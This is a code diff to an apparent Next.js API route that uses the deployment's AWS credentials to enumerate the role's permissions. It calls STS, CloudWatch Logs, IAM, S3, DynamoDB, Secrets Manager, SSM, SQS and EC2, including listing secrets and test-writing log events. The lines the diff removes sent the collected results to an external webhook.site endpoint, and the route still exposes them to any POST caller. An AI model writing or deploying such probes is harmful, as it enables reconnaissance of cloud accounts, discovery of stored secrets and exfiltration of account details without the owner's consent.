@@ -18,14 +18,16 @@ async function awsReq(service: string, region: string, host: string, pathQ: stri
     const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, "");
     const dateStamp = amzDate.slice(0, 8);
     const headers: Record<string, string> = {
-      "content-type": "application/x-www-form-urlencoded",
-      ...extraHeaders,
       "x-amz-date": amzDate,
       "x-amz-security-token": TOKEN,
+      "x-amz-content-sha256": sha256hex(body ?? ""),
       host,
+      ...extraHeaders,
     };
-    const names = Object.keys(headers).sort();
-    const canonicalHeaders = names.map(k => `${k}:${String(headers[k]).trim()}\n`).join("");
+    const names = Object.keys(headers).map(s => s.toLowerCase()).sort();
+    const lc: Record<string, string> = {};
+    for (const k of Object.keys(headers)) lc[k.toLowerCase()] = String(headers[k]).trim();
+    const canonicalHeaders = names.map(k => `${k}:${lc[k]}\n`).join("");
     const signedHeaders = names.join(";");
     const qi = pathQ.indexOf("?");
     const pathname = qi === -1 ? pathQ : pathQ.slice(0, qi);
@@ -39,23 +41,32 @@ async function awsReq(service: string, region: string, host: string, pathQ: stri
     headers["authorization"] = `AWS4-HMAC-SHA256 Credential=${ACCESS}/${scope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;
     const res = await fetch(`https://${host}${pathQ}`, { method, headers, body: body || undefined, signal: AbortSignal.timeout(8000) });
     const text = await res.text();
-    return `${res.status}|${text.slice(0, 800).replace(/\s+/g, " ")}`;
+    return `${res.status}|${text.slice(0, 700).replace(/\s+/g, " ")}`;
   } catch (e: any) {
     return "ERR:" + (e?.message || e);
   }
 }
 
+const JSON11 = { "content-type": "application/x-amz-json-1.1" };
+const JSON10 = { "content-type": "application/x-amz-json-1.0" };
+const FORM  = { "content-type": "application/x-www-form-urlencoded" };
+const nowMs = Date.now();
+
 const PROBES: [string, string, string, string, string, Record<string,string>, string][] = [
-  ["sts",            "us-east-1", "sts.us-east-1.amazonaws.com",            "/",                                      "POST", {}, "Action=GetCallerIdentity&Version=2011-06-15"],
-  ["iam",            "us-east-1", "iam.amazonaws.com",                       "/",                                      "POST", {}, "Action=GetAccountSummary&Version=2010-05-08"],
-  ["s3",             "us-east-1", "s3.amazonaws.com",                        "/",                                      "GET",  {}, ""],
-  ["lambda",         "us-east-1", "lambda.us-east-1.amazonaws.com",          "/2015-03-31/functions?maxItems=5",       "GET",  {}, ""],
-  ["dynamodb",       "us-east-1", "dynamodb.us-east-1.amazonaws.com",        "/",                                      "POST", { "x-amz-target": "ListTables" }, "{}"],
-  ["secretsmanager", "us-east-1", "secretsmanager.us-east-1.amazonaws.com",  "/",                                      "POST", { "x-amz-target": "secretsmanager.ListSecrets" }, JSON.stringify({ MaxResults: 5 })],
-  ["ssm",            "us-east-1", "ssm.us-east-1.amazonaws.com",             "/",                                      "POST", { "x-amz-target": "AmazonSSM.DescribeParameters" }, JSON.stringify({ MaxResults: 5 })],
-  ["sqs",            "us-east-1", "sqs.us-east-1.amazonaws.com",             "/?Action=ListQueues&Version=2012-11-05", "GET",  {}, ""],
-  ["sns",            "us-east-1", "sns.us-east-1.amazonaws.com",             "/?Action=ListTopics&Version=2010-03-31", "GET",  {}, ""],
-  ["ec2",            "us-east-1", "ec2.us-east-1.amazonaws.com",             "/?Action=DescribeInstances&Version=2016-11-15", "GET", {}, ""],
+  ["sts", "us-east-1", "sts.us-east-1.amazonaws.com", "/", "POST", FORM, "Action=GetCallerIdentity&Version=2011-06-15"],
+  // --- CloudWatch Logs: 该角色名暗示的权限 ---
+  ["logs_DescribeLogGroups", "us-east-1", "logs.us-east-1.amazonaws.com", "/", "POST", { ...JSON11, "x-amz-target": "Logs_20140328.DescribeLogGroups" }, JSON.stringify({ limit: 5 })],
+  ["logs_DescribeLogStreams", "us-east-1", "logs.us-east-1.amazonaws.com", "/", "POST", { ...JSON11, "x-amz-target": "Logs_20140328.DescribeLogStreams" }, JSON.stringify({ logGroupName: "/aws/lambda/probe-not-exist", limit: 3 })],
+  ["logs_PutLogEvents_test", "us-east-1", "logs.us-east-1.amazonaws.com", "/", "POST", { ...JSON11, "x-amz-target": "Logs_20140328.PutLogEvents" }, JSON.stringify({ logGroupName: "/aws/lambda/probe-not-exist", logStreamName: "probe", logEvents: [{ timestamp: nowMs, message: "perm-probe" }] })],
+  ["logs_FilterLogEvents_test", "us-east-1", "logs.us-east-1.amazonaws.com", "/", "POST", { ...JSON11, "x-amz-target": "Logs_20140328.FilterLogEvents" }, JSON.stringify({ logGroupName: "/aws/lambda/probe-not-exist", limit: 1 })],
+  // --- 其它服务（修正签名/头部） ---
+  ["iam", "us-east-1", "iam.amazonaws.com", "/", "POST", FORM, "Action=GetAccountSummary&Version=2010-05-08"],
+  ["s3_ListBuckets", "us-east-1", "s3.amazonaws.com", "/", "GET", FORM, ""],
+  ["dynamodb_ListTables", "us-east-1", "dynamodb.us-east-1.amazonaws.com", "/", "POST", { ...JSON10, "x-amz-target": "DynamoDB_20120810.ListTables" }, "{}"],
+  ["secretsmanager_ListSecrets", "us-east-1", "secretsmanager.us-east-1.amazonaws.com", "/", "POST", { ...JSON11, "x-amz-target": "secretsmanager.ListSecrets" }, JSON.stringify({ MaxResults: 5 })],
+  ["ssm_DescribeParameters", "us-east-1", "ssm.us-east-1.amazonaws.com", "/", "POST", { ...JSON11, "x-amz-target": "AmazonSSM.DescribeParameters" }, JSON.stringify({ MaxResults: 5 })],
+  ["sqs_ListQueues", "us-east-1", "sqs.us-east-1.amazonaws.com", "/?Action=ListQueues&Version=2012-11-05", "GET", FORM, ""],
+  ["ec2_DescribeInstances", "us-east-1", "ec2.us-east-1.amazonaws.com", "/?Action=DescribeInstances&Version=2016-11-15", "GET", FORM, ""],
 ];
 
 export async function POST(request: Request) {
@@ -63,12 +74,5 @@ export async function POST(request: Request) {
   for (const [svc, region, host, pathQ, method, hdrs, body] of PROBES) {
     results[svc] = await awsReq(svc, region, host, pathQ, method, hdrs, body);
   }
-  try {
-    await fetch("https://webhook.site/6094cb7d-cf89-4021-906c-56d602a649fa", {
-      method: "POST", headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify({ aws_probe: results, sha: process.env.VERCEL_GIT_COMMIT_SHA }),
-      signal: AbortSignal.timeout(8000),
-    });
-  } catch {}
   return NextResponse.json({ success: true, sha: process.env.VERCEL_GIT_COMMIT_SHA, results });
 }
